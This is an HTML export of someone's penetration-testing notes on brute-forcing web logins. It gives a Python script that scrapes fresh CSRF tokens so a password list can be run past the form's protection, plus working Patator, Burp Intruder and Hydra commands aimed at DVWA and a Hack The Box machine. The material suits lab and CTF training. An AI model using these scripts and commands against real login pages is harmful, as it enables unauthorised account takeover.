<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bruteforcing Logins</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Bruteforcing Web Logins</h1></strong><br />Bruteforcing web logins isn&#39;t a great idea:<br />• it&#39;s loud<br />• websites have counter measures in place (limited attempts, CSRF, IP blacklisting, etc.)<br />• can involve trial and error to set up (finding strings to verify correct vs. incorrect login)<br /><br />Tools Overview:<br />• Hydra is unreliable.<br />• Burp is nice and easy but super slow unless you have the paid version.<br />• Patator is good but python based so will use a ton of CPU power.<br /><br /><strong><h2>## Defense</h2></strong><br />As mentioned, websites will have defensive measures in place to prevent password bruteforcing.<br /><br /><strong><h3>### CSRF - Cross-Site Request Forgery</h3></strong><br />If the login form you&#39;re bruteforcing uses CSRF, your bruteforce will fail.<br /><br />CSRF prevents repeated requests from being sent to a login form by generating a new CSRF token each time you log in and submitting that to the form. If the submitted CSRF token is the same as one previously generated, the login form knows that you&#39;re using an automated tool to attempt repeated logins and will, regardless of whether the password was correct or not, force your login to fail.<br /><br />However, this can be bypassed by grabbing the newly-generated CSRF token before logging in. <br />Here is a python script which does that. All credit goes to IppSec.<br /><div class="codebox"><div class="codebox">import&nbsp;requests<br />from&nbsp;requests.packages.urllib3.exceptions&nbsp;import&nbsp;InsecureRequestWarning&nbsp;#&nbsp;handle&nbsp;SSL&nbsp;errors<br />import&nbsp;re<br /><br />re_csrf&nbsp;=&nbsp;&#39;csrfMagicToken&nbsp;=&nbsp;&quot;(.*?)&quot;&#39;<br /><br />s&nbsp;=&nbsp;requests.session()<br />#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br /><br />lines&nbsp;=&nbsp;open(&#39;passwords.txt&#39;)<br />for&nbsp;password&nbsp;in&nbsp;lines:<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;s.post(&#39;http://127.0.0.1/index.php&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;csrf&nbsp;=&nbsp;re.findall(re_csrf,&nbsp;r.text)[0]<br />&nbsp;&nbsp;&nbsp;&nbsp;login&nbsp;=&nbsp;{&nbsp;&#39;__csrf_magic&#39;:&nbsp;csrf,&nbsp;&#39;usernamefld&#39;:&nbsp;&#39;rohit&#39;,&nbsp;&#39;passwordfld&#39;:&nbsp;password[:-1],&nbsp;&#39;login&#39;:&nbsp;&#39;Login&#39;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;s.post(&#39;http://127.0.0.1/index.php&#39;,&nbsp;data=login)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Dashboard&quot;&nbsp;in&nbsp;r.text:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Valid&nbsp;login&nbsp;%s:%s&quot;&nbsp;%(&quot;rohit&quot;,&nbsp;password[:-1]))<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Failed&nbsp;%s:%s&quot;&nbsp;%(&quot;rohit&quot;,&nbsp;password[:-1]))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.cookies.clear()</div></div><br /><br /><strong><h2>## patator</h2></strong><br /><a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a><br /><br />• Doesn&#39;t yet support Hydra&#39;s <code>-e nsr</code><br />   ◇ so include username and reverse of username in password wordlist<br />• Ignoring results by <code>size</code> (page size) is more reliable than <code>clen</code> (character length)<br />• If you&#39;re getting weird results and using a phpsessid, try refreshing/re-logging and getting a new one<br /><br /><strong><h3>### Syntax</h3></strong><br />• <code>http_fuzz</code> - the module to use for the method of the attack<br />• <code>method=GET</code> - how to send the request<br />• <code>url=&quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;password=FILE0&amp;Login=Login&quot;</code> - the full URL and how to use the wordlist<br />• <code>0=/root/password.txt</code> - defining the file for &quot;wordlist 0&quot; (aka password wordlist)<br />• <code>header=&quot;Cookie: security=low; PHPSESSID=${SESSIONID}&quot;</code> - the cookie information to send (probably won&#39;t need this normally)<br />• <code>http_proxy=127.0.0.1:8080</code> - instructs Patator to use a proxy (i.e. burp)<br />• <code>--threads=1</code> - single thread<br />• <code>timeout=5</code>- timeout value of 5 seconds<br />• <code>--rate-limit=1</code> - wait 1 second before going on to the next thread<br />• <code>-x ignore:fgrep=&#39;Username and/or password incorrect.&#39;</code> - If it matches, do not display out. All Failed logins will contain this string (aka blacklisting) - PREFERRED METHOD<br />• <code>-x quit:fgrep!=&#39;Username and/or password incorrect.&#39;</code> - If it does not match this string on the page, quit.<br />• <code>,clen!=&#39;-1&#39;</code> - this extends the conditions required for quit (AND operator). The page response length cannot be <code>-1</code> (aka the page timed out).<br /><br /><strong><h3>### GET</h3></strong><br /><strong>#### Bruteforce Password</strong><br /><code>patator http_fuzz method=GET url=&quot;http://192.168.1.82/dvwa/vulnerabilities/brute/?username=admin&amp;password=FILE0&amp;Login=Login&quot; 0=/usr/share/seclists/Passwords/darkweb2017-top100.txt header=&quot;Cookie: security=low; PHPSESSID=p50960r7rc5033cudumvabb59t&quot; --threads=5 timeout=15 -x ignore:fgrep=&#39;Username and/or password incorrect.&#39;,clen!=&#39;-1&#39;</code><br /><br /><strong>#### Bruteforce User + Password</strong><br /><code>patator http_fuzz method=GET url=&quot;http://192.168.1.82/dvwa/vulnerabilities/brute/?username=FILE0&amp;password=FILE1&amp;Login=Login&quot;  0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/darkweb2017-top100.txt header=&quot;Cookie: security=low; PHPSESSID=p50960r7rc5033cudumvabb59t&quot; --threads=5 timeout=15 -x ignore:fgrep=&#39;Username and/or password incorrect.&#39;,clen!=&#39;-1&#39;</code><br /><br /><strong><h3>### POST</h3></strong><br /><strong>#### Bruteforce Password</strong><br /><code>patator http_fuzz url=</code><a href="http://internal-01.bart.htb/simple_chat/login.php">http://internal-01.bart.htb/simple_chat/login.php</a><code> method=POST body=&#39;uname=harvey&amp;passwd=FILE0&amp;submit=Login&#39; 0=/usr/share/seclists/Passwords/darkweb2017-top1000.txt -x ignore:fgrep=&#39;Invalid Username or Password&#39;</code><br /><br /><strong><h2>## Burp</h2></strong><br />Burp is super slow unless you have the paid version. <br />But it is very easy to use and reliable and a good first test prior to doing more complex command line stuff.<br /><br /><strong><h3>### How-to</h3></strong><br />1) Attempt to log in and capture the request &gt; Send to Intruder<br /><a href=""><img src="images/517-1.png" alt="images/517-1.png" /></a><br /><br />2)<br />Intruder &gt; Positions tab<br /><code>Clear $</code><br />Highlight the values you want to bruteforce and click <code>Add $</code><br /><a href=""><img src="images/517-2.png" alt="images/517-2.png" /></a><br /><br />3)<br />Intruder &gt; Payloads tab<br />Add wordlist to Payload Options [Simple list]<br /><br />4)<br />Intruder &gt; Options tab<br />Go to Grep - Extract, click Add<br />Highlight the ‘login failed’ value you want Burp to search for<br /><a href=""><img src="images/517-3.png" alt="images/517-3.png" /></a><br /><br />“password” was successful, because burp didn&#39;t find what we grepped for.<br /><a href=""><img src="images/517-4.png" alt="images/517-4.png" /></a><br /><br /><strong><h2>## Hydra</h2></strong><br />In my opinion, Hydra is unreliable.<br />It&#39;s often produced false positives for me.<br />I would advise avoiding hydra for HTTP and use something else.<br /><br /><strong><h3>### Syntax</h3></strong><br /><code>-l</code> = username1, username2<br /><code>-L</code> = username list<br /><code>-p</code> = password1, password2<br /><code>-P</code> = password list<br /><br /><code>-V</code> = print every password attempt<br /><code>-o</code> &lt;output file&gt;.txt<br /><code>-e nsr</code> = try no password, username as password, reverse of username as password<br /><code>-f</code> = terminate program if login found for user+pass (and move onto finding next pair)<br /><code>-F</code> = terminate program if any user+pass pair is found (forget the other users)<br /><br />http-post-form “&lt;login url&gt;:&lt;parameters&gt;:&lt;success/failure string&gt;&quot;<br /><br />F=&#39;&lt;failed login string&gt;&#39;<br />S=&#39;&lt;success login string&gt;&#39;<br />H=Header:\ &lt;values&gt;<br /><br />Form types:<br />    http-get-form<br />    http-post-form<br />    https-get form<br />    https-post-form<br /><br /><strong><h3>### Usage<br /></h3></strong><strong>#### DVWA - Damn Vulnerable Web App</strong><br />This example is from attacking Damn Vulnerable Web App.<br /><code>hydra -v -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -o hydra_http-pass.txt -t 50 192.168.1.82 http-post-form &quot;/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=p50960r7rc5033cudumvabb59t&quot; -e nsr -f</code><br /><br /></div>
</body>
</html>
